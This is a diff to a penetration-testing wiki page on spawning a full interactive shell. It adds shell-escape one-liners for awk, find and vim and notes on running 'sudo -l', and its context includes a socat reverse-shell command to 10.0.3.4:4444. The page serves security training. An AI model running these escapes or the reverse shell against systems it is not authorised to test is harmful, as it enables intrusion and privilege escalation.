@@ -16,6 +16,8 @@ Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-s
 {% endhint %}
 
 ## Full TTY
+if  we established a shell session with the target. Initially, our shell was limited (sometimes referred to as a jail shell), so we used python to spawn a TTY bourne shell to give us access to more commands and a prompt to work from==(ex: run the sudo -l)==
+
 
 Note that the shell you set in the `SHELL` variable **must** be **listed inside** _**/etc/shells**_ or `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Also, note that the next snippets only work in bash. If you're in a zsh, change to a bash before obtaining the shell by running `bash`.
 
@@ -99,11 +101,16 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
 * perl: `exec "/bin/sh";`
 * ruby: `exec "/bin/sh"`
 * lua: `os.execute('/bin/sh')`
+* AWK: `awk 'BEGIN {system("/bin/sh")}'`
 * IRB: `exec "/bin/sh"`
+* find: `find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;` or `find . -exec /bin/sh \; -quit`
 * vi: `:!bash`
 * vi: `:set shell=/bin/bash:shell`
+* vim: `vim -c ':!/bin/sh'` or `vim :set shell=/bin/sh :shell`
 * nmap: `!sh`
+>We can always attempt to run this command to list the file properties and permissions our account has over any given file or binary:`ls -la <path/to/fileorbinary>`,
 
+>`sudo -l`: command above will need a stable interactive shell to run,If you are not in a full shell or sitting in an unstable shell, you may not get any return from it
 ## ReverseSSH
 
 A convenient way for **interactive shell access**, as well as **file transfers** and **port forwarding**, is dropping the statically-linked ssh server [ReverseSSH](https://github.com/Fahrj/reverse-ssh) onto the target.
